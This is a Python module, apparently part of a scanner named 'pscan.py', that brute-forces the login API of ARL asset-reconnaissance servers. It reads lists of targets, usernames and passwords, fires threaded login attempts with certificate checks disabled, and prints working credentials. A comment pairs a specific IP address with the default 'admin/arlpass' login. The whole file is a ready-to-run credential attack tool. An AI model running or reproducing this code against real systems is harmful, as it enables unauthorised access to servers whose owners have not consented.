import requests
import warnings
from urllib3.exceptions import InsecureRequestWarning
import threading

# 禁用InsecureRequestWarning
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

def attempt_login(url,user,passwd):
    try:
        url = 'https://' + url + '/api/user/login'
        data = "{\r\n  \"username\":\""+user+"\",\r\n  \"password\":\"" + passwd + "\"\r\n}"
        headers = {
            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Sec-Ch-Ua-Mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9'
        }
        try:
            response = requests.post(url=url, data=data, headers=headers, verify=False)
            if user in response.text:
                print(url+"\tsuccess: "+user+'/'+passwd)
        except:
            pass
    except:
        pass
def run_arl(args):
    # python pscan.py exp -poc ARL -url 8.219.152.26:5003 -user admin -pwd arlpass
    print('''例:python pscan.py exp -url qq.com -user admin -pwd 123456
   python pscan.py exp -urlfile urls.txt -userfile users.txt -passfile pass.txt\n''')
    urls = []
    usernames = []
    passwords = []
    urlfile = args.urlfile
    userfile = args.userfile
    passfile = args.passfile
    url = args.url
    user = args.user
    pwd = args.pwd
    try:
        if url != None:
            urls.append(url)
        elif urlfile != '':
            with open(urlfile, 'r') as file:
                urls = [line.strip() for line in file]
    except:
        pass
    try:
        if user != None:
            usernames.append(user)
        elif userfile != '':
            with open(userfile, 'r') as file:
                usernames = [line.strip() for line in file]
    except:
        pass
    try:
        if pwd != None:
            passwords.append(pwd)
        elif passfile != '':
            with open(passfile, 'r') as file:
                passwords = [line.strip() for line in file]
    except:
        pass
    # 创建一个线程列表
    threads = []
    # 创建并启动线程
    for url in urls:
        for user in usernames:
            for passwd in passwords:
                thread = threading.Thread(target=attempt_login, args=(url,user,passwd))
                threads.append(thread)
                thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

